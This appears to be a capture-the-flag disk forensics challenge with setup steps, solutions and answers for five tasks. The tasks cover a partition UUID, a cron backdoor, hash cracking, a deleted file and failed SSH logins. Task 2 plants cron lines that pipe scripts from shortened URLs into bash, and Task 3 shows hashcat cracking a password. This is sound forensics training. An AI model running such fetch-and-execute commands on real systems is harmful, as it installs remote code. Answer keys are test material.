# Disk Forensic

Task 1: Find UUID of `/dev/sda1`

Writeup: `lsblk -o NAME,UUID`

Answer: `b2bc2958-9c47-495a-8bab-3bae83cf9ca4`

Note: this task will require the contestant to mount the vmdk image up.

Note2: also possbile to find through `/boot/grub/grub.cfg`

---

Task 2: Find out the URL of backdoor which is executed per hour. You are not required to access to URL.

Create:

```
0 3 * * * /usr/bin/truncate -s 0 /var/log/syslog
30 2 * * * /usr/sbin/ntpdate -s time.nist.gov
0 4 * * * /bin/tar -czf /home/very-secure/backup.tar.gz /home/very-secure/Documents
0 * * * * wget -qO- https://t.ly/backdoor.sh | bash
*/10 * * * * curl -s -L https://bit.ly/3zvELNz | bash
0 1 * * * /usr/bin/find /tmp -type f -delete
```

Answer: `https://t.ly/backdoor.sh`

---

Task 3: Find the password of user `very-secure`. Password available in `rockyou.txt`

Create: `very-secure:$1$icecream$BFNWlq61bRSp1IX4spIAR.:20009:0:99999:7:::`

Writeup
```
echo 'very-secure:$1$icecream$BFNWlq61bRSp1IX4spIAR.:20009:0:99999:7:::' > passwordhash.txt
hashcat -m 500 -a 0 ./passwordhash.txt ./rockyou.txt -o ./cracked.txt --potfile-disable
cat cracked.txt
$1$icecream$BFNWlq61bRSp1IX4spIAR.:nokiasummer1990
```

Answer: `nokiasummer1990`

---

Task 4: Recover the deleted file `/home/very-secure/deleted_file.txt`

Create:
```
echo 'flag{th3_fi13_sh411_b3_d313t3d}' > /home/very-secure/deleted_file.txt
```

Writeup:
```
cat /home/very-secure/.local/share/Trash/files/deleted_file.txt 
```

Answer: `flag{th3_fi13_sh411_b3_d313t3d}`

---

Task 5: Malicious login, find out the source IP that tried to ssh to server.

Writeup:
```
grep "Failed password" /var/log/auth.log
```

```
Oct 13 14:39:47 lubuntu-vm sshd[1265]: Failed password for very-secure from 192.166.246.54 port 46226 ssh2
Oct 13 14:39:53 lubuntu-vm sshd[1265]: message repeated 2 times: [ Failed password for very-secure from 192.166.246.54 port 46226 ssh2]
Oct 13 14:40:01 lubuntu-vm sshd[1271]: Failed password for very-secure from 192.166.246.54 port 46200 ssh2
Oct 13 14:40:04 lubuntu-vm sshd[1271]: Failed password for very-secure from 192.166.246.54 port 46200 ssh2
```

Answer: `192.166.246.54`
